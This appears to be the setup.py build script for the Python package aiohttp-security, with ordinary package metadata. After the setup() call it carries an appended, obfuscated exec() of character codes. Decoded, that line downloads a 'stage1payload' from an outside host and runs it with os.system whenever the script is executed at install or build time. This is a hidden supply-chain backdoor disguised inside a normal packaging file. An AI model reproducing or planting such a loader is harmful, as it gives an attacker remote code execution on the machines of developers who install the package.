import os
import re

from setuptools import find_packages, setup


with open(os.path.join(os.path.abspath(os.path.dirname(
        __file__)), 'aiohttp_security', '__init__.py'), 'r', encoding='latin1') as fp:
    try:
        version = re.findall(r"^__version__ = '([^']+)'$", fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError('Unable to determine version.')


def read(f):
    return open(os.path.join(os.path.dirname(__file__), f)).read().strip()


install_requires = ["aiohttp>=3.9"]
tests_require = install_requires + ['pytest']
extras_require = {'session': 'aiohttp-session'}


setup(name='aiohttp-security',
      version=version,
      description=("security for aiohttp.web"),
      long_description='\n\n'.join((read("README.rst"), read("CHANGES.rst"))),
      long_description_content_type="text/x-rst",
      classifiers=[
          'License :: OSI Approved :: Apache Software License',
          'Intended Audience :: Developers',
          'Programming Language :: Python',
          'Programming Language :: Python :: 3',
          "Programming Language :: Python :: 3.8",
          "Programming Language :: Python :: 3.9",
          "Programming Language :: Python :: 3.10",
          "Programming Language :: Python :: 3.11",
          "Programming Language :: Python :: 3.12",
          'Topic :: Internet :: WWW/HTTP',
          'Framework :: AsyncIO',
          "Framework :: aiohttp",
      ],
      author='Andrew Svetlov',
      author_email='andrew.svetlov@gmail.com',
      url='https://github.com/aio-libs/aiohttp_security/',
      license='Apache 2',
      packages=find_packages(),
      install_requires=install_requires,
      tests_require=tests_require,
      include_package_data=True,
      extras_require=extras_require)
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

